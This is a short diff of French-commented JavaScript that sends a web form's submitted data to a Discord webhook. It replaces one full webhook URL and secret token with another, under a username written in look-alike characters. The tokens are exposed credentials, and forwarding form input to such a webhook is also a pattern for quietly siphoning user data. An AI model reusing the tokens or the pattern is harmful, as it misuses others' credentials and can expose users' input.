@@ -2,7 +2,7 @@ document.querySelector("form").addEventListener("submit", async (e) => {
     e.preventDefault(); // Empêche le rechargement de la page
 
     const formData = new FormData(e.target); // Récupère les données du formulaire
-    const webhookURL = "https://discord.com/api/webhooks/1390447197300064508/eNoOeFF2SMu7-kO3GpuIIl9FbZLcXwB6RLQijVlmQjhXybkNZ5XLDTA6lt_lX18j-tXJ"; // Remplacez par votre Webhook Discord
+    const webhookURL = "https://discord.com/api/webhooks/1390847661053050991/nIIoMFIihoSjQlIsvaFDzWyUwCVrzwCwna3xyasOL446D8Rs-IWARc2wnYsLPB5OZa3m"; // Remplacez par votre Webhook Discord
 
     const data = {
         username: 'Ruиgis Liиεr | Partner',
